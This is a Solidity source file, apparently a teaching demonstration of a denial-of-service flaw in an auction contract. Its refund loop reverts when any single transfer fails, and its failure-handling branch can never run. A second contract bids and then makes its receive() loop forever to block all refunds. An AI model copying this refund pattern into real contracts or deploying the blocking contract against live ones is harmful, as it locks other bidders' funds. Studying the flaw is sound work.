// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DosAuction {
    address payable owner;
    mapping (address => uint) bidders;
    address[] addresses;
    address[] failedReceivers;
    uint refundProgress;

    constructor() {
        owner = payable(msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "You're not an owner");
        _;
    }

    function getCurrentBalance() external view returns(uint) {
        return address(this).balance;
    }

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        addresses.push(msg.sender);
    }

    function refund() external onlyOwner {
        for (uint i = refundProgress; i < addresses.length; i++) {
            address receiver = addresses[i];
            if (bidders[receiver] > 0) {
                (bool result, ) = addresses[i].call{value: bidders[receiver]}("");
                require(result, "Transaction failed");
                if (!result) {
                    failedReceivers.push(receiver);
                }
                refundProgress++;
            }
        }
    }
}

contract DosUsage {
    address payable owner;
    DosAuction auction;
    bool dos;

    constructor(address auctionAddress) {
        owner = payable(msg.sender);
        auction = DosAuction(auctionAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "You're not an owner");
        _;
    }

    function bid() external payable onlyOwner {
        auction.bid{value: msg.value}();
    }

    function toggleDos() external onlyOwner {
        dos = !dos;
    }

    function refund() external onlyOwner {
        auction.refund();
    }

    receive() external payable {
        if (dos) {
            while(true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}